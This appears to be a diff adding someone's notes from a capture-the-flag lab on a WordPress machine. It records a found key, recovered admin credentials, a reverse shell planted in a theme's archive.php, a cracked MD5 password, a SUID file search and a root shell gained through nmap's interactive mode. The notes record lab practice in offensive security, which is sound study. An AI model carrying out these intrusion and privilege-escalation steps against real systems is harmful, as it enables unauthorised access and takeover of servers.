@@ -1,0 +1,29 @@
+Hidden info form web pages
+--------------------------
+
+http://10.10.235.128/key-1-of-3.txt-> 073403c8a58a1f80d943455fb30724b9
+
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+
+#wp info
+<admin:generatorAgent rdf:resource="http://wordpress.org/?v=4.3.1"/>
+
+wp version = 4.3.1
+
+
+#Wp login
+Username: Elliot, Password: ER28-0652
+
+
+#reverse shell uploaded @ archive.php
+http://10.10.235.128/wp-content/themes/twentyfifteen/archive.php
+
+#password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+cracked pass :: abcdefghijklmnopqrstuvwxyz
+
+cat fsocity.dic | sort -u | uniq > fsocity.txt --> to sort the file & get rid of dupps
+
+find / -perm -4000 2>/dev/null //to find file permissions
+
+use namp interactive & "!sh" to get the root shell
